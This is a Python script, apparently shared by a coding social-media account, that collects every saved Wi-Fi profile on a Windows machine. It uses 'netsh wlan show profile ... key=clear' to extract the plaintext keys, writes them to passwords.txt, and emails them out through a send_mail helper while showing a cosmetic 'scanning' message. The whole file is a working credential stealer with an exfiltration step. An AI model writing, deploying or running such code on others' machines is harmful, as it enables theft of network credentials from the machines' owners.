# -*- coding: utf-8 -*-
import subprocess
import locale
import re, time, os
import codecs
from termcolor import colored
from send_email import send_mail

locale.setlocale(locale.LC_ALL, "Turkish")

def hidden(_str_, size=4):
    # Hidden password contents
    numofstar = len(_str_) - size
    return _str_[:size] + '*'*numofstar

def replacer(_str_):
    # It's for Turkish chars
    REPLACE = {
    '§':'ğ',
    '\x9e': 'Ş',
    }
    for i,j in REPLACE.items():
        _str_ = _str_.replace(i, j)
    return _str_

if __name__ == '__main__':
    print("Checking 'config.txt' file")
    if "config.txt" not in os.listdir('.'):
        email = input("Your email address:")
        with open('config.txt', 'w') as f:
            f.write('{};'.format(email))
    else:
        with open('config.txt', 'r') as f:
            email = f.read().split(';')[0]

    print("System is scanning...")
    time.sleep(2)

    response = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profiles']
    ).decode('iso-8859-9').replace('\r', '').split('\n')

    profiles = [x.split(':')[1].strip() for x in response if "All User Profile" in x]

    Passwords = {}
    for _,__profile__ in enumerate(profiles):
        profile = replacer(__profile__)
        try:
            pass_response = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').replace('\r', '\n').split('\n')
            password = [x.split(':')[1].strip() for x in pass_response if "Key Content" in x]
            print(f"Profile: {profile}")
            Passwords[profile] = password if password else ['None']
        except :
            print(f"Unsuccess!\n\t Profile: {profile}")

    print("{}".format('#'*70))    
    print("@Codewithperesthayal >> https://www.instagram.com/codewithperesthayal")
    with codecs.open('passwords.txt', 'w', 'utf-8') as f:
        f.write("{}\n".format('#'*70))
        f.write("@Codewithperesthayal >> https://www.instagram.com/codewithperesthayal\n")
        f.write("{}\n\n".format('#'*70))

        for i, items in enumerate(Passwords.items()): 
            i,j = items
            f.write(">> {:<40}:{:<30}\n".format(i,j[0]))
    send_mail(email)
    

